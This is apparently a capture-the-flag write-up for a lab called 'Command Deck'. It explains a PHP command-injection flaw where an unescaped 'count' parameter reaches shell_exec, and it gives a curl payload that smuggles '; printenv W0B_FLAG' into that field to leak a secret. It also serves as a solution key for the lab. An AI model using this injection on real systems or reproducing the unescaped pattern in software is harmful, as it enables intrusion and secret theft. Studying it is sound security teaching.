# w06 :: Command Deck — writeup

## Root cause

`app/index.php`, the one shell call that builds the command line:

```php
$cmd = $tool . ' ' . $opt . ' ' . ($_POST['count'] ?? $_GET['count'] ?? '1') . ' ' . escapeshellarg($host);
$out = shell_exec($cmd . ' 2>&1');
```

`$tool` is whitelisted against `['ping', 'traceroute']` and `$host` goes
through `escapeshellarg`, which is exactly the hygiene a reader expects to see
— and it covers two of the three caller-controlled values. The third, `count`,
is concatenated raw. The PHP never opens a shell *argument* problem: the whole
string is handed to `sh -c` by `shell_exec`, so `;`, `&&`, `|`, and backticks
in `count` are shell syntax, not data.

The flag is deliberately unreachable without this. It lives only in the
container environment (`W0B_FLAG`), read in PHP via `getenv()`, and no web path
serves it, so the injection has to both execute a command *and* have that
command read the environment — `printenv` (or `env`) in the payload, not a
file read.

## Exploit

```bash
curl -s http://localhost:30006/ \
  --data-urlencode 'tool=ping' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'count=1; printenv W0B_FLAG'
```

The shell runs `ping -c 1; printenv W0B_FLAG '127.0.0.1' 2>&1` — the ping does
its thing (it fails fast on a bad flag count at worst), then `printenv` prints
the flag, and `shell_exec` returns both outputs, which the page renders in the
deck output block.

`solution/exploit.sh` runs exactly this and greps the flag out.

## Flag

`hex4b0t{...}` — injected at runtime as the `W0B_FLAG` environment variable by
`docker-compose.yml`; never present in an image layer or a served file.

## Submit

`bash solution/exploit.sh` against a running lab prints the flag; paste it as
`hex4b0t{...}`.
